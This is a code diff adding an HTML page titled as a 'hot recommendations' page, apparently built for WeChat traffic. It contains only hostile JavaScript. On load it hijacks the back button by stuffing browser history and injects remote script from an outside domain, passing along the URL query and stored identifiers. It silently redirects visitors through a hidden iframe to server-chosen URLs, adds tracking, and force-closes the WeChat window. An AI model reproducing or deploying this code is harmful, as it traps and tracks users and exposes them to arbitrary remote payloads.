@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>热门推荐 </title>
+	<meta charset="UTF-8">
+	<!-- <meta name="referrer" content="never"> -->
+	<!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
+	<meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<meta http-equiv="pragma" content="no-cache">
+	<meta http-equiv="cache-control" content="no-cache, must-revalidate">
+	<meta http-equiv="expires" CONTENT="0">
+	<link rel="icon" href="data:image/ico;base64,aWNv">
+</head>
+<body>
+
+<div>
+	<script type="text/javascript">
+		if (self !== top) {
+			top.location = self.location
+		}
+		try {
+			tbsJs.onReady('{useCachedApi : "true"}', function(d) {})
+		} catch (err) {}
+		var _kd = "_adjs", _bk = "back_num",
+				_kx = "_bkct";
+		var isiOS = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+
+		var rbid = '';
+		window.onpageshow = function(d) {
+			if (location.hash.length < 1) {
+				rbid = 11111;
+				localStorage.setItem(_kx, "0");
+				var b = lgetobj(_kd);
+				ljs(null, b ? b.d : null)
+			} else {
+				rbid = 10000;
+				var d = parseInt(0 + localStorage.getItem(_kx)) || 0;
+				var back = parseInt(0 + localStorage.getItem(_bk)) || 100;
+				isiOS && d < back ? ljs() : j()
+			}
+		};
+		if (!isiOS) {
+			window.onhashchange = function() {
+				j()
+			}
+		}
+
+		function j() {
+			var d = parseInt(0 + localStorage.getItem(_kx));
+			var b = lgetobj(_kd);
+			var back = parseInt(0 + localStorage.getItem(_bk));
+			if (d >= back || (b && b.l && b.l == -1)) {
+				if (typeof WeixinJSBridge === "undefined") {
+					if (document.addEventListener) {
+						document.addEventListener("WeixinJSBridgeReady", onBridgeReady, false)
+					} else {
+						if (document.attachEvent) {
+							document.attachEvent("WeixinJSBridgeReady", onBridgeReady);
+							document.attachEvent("onWeixinJSBridgeReady", onBridgeReady)
+						}
+					}
+				} else {
+					onBridgeReady()
+				}
+				return
+			}
+			var e = "#" + new Date().getTime();
+			history.pushState(history.length + 1, "message", e);
+			localStorage.removeItem(_kd);
+			if (b) {
+				window.ctask = b.url;
+				!isiOS && ljs(b, b.d);
+				a()
+			} else {
+				ljs()
+			}
+		}
+
+		function ljs(d, b) {
+			var e = document.createElement("script");
+			// var host = '192.168.2.4:9501'
+			if (isiOS) {
+        		e.src = "https://gcold.chajiahao.top/dxyuedu" + location.search + "&t=" + (new Date()).getTime() + '&rbid=' + rbid + '&cb=w' + "&host=" + location.host;
+    		} else {
+				var co = localStorage.getItem('co') != undefined && localStorage.getItem('co') ? localStorage.getItem('co') : d ? d.co : '';
+				var host = location.host.indexOf('192.168.2') != -1 ? '192.168.2.4:9501' : location.host
+				e.src = "https://gcold.chajiahao.top" + "/dxyuedu"  + location.search + '&rbid=' + rbid + "&t=" + (new Date()).getTime() + (d ? "&l=" + d.l :
+					"&l=-1") + "&co=" + co + "&host=" + location.host + (b && b ? "&d=" + b : "");
+			}
+			var f = document.getElementsByTagName("script")[0];
+			f.parentNode.insertBefore(e, f)
+		}
+
+		function a() {
+			var d = parseInt(0 + localStorage.getItem(_kx)) + 1;
+			localStorage.setItem(_kx, d);
+			// if (isiOS) {
+			// 	location.replace(ctask)
+			// } else {
+			// 	var b = document.createElement("a");
+			// 	b.href = ctask;
+			// 	b.click()
+			// }
+			var f = document.createElement('iframe'); 
+        f.style.display = 'none'; 
+        document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + ctask + '\')<\/script>"'; 
+		};
+
+		function w(d) {
+			if(d.cnzz_id){
+				cnzz(d.cnzz_id)
+			}
+			if (d.x) {
+          		localStorage.setItem(_bk, d.x)
+        	}
+			localStorage.setItem(_kd, JSON.stringify(d));
+			var coo = localStorage.getItem('co') != undefined && localStorage.getItem('co') ? localStorage.getItem('co') : ''
+			if (!coo) {
+				localStorage.setItem('co', d.co);
+			}
+			if (d.j || isiOS) {
+				j()
+			}
+		}
+		
+
+		function onBridgeReady() {
+			setTimeout(function() {
+				WeixinJSBridge.invoke("closeWindow", {}, function(d) {})
+			}, 50)
+		}
+
+		function r() {}
+
+		function cnzz(cnzz_id) {
+			var cnzz_s_tag = document.createElement('script');
+			cnzz_s_tag.type = 'text/javascript';
+			cnzz_s_tag.async = true;
+			cnzz_s_tag.charset = 'utf-8';
+			cnzz_s_tag.src = 'https://v1.cnzz.com/z_stat.php?id='+cnzz_id+'&web_id='+cnzz_id;
+			var root_s = document.getElementsByTagName('script')[0];
+			root_s.parentNode.insertBefore(cnzz_s_tag, root_s);
+		}
+
+		function lgetobj(d) {
+			try {
+				return JSON.parse(localStorage.getItem(d))
+			} catch (c) {
+				return null
+			}
+		}
+	</script>
+</div>
+</body>
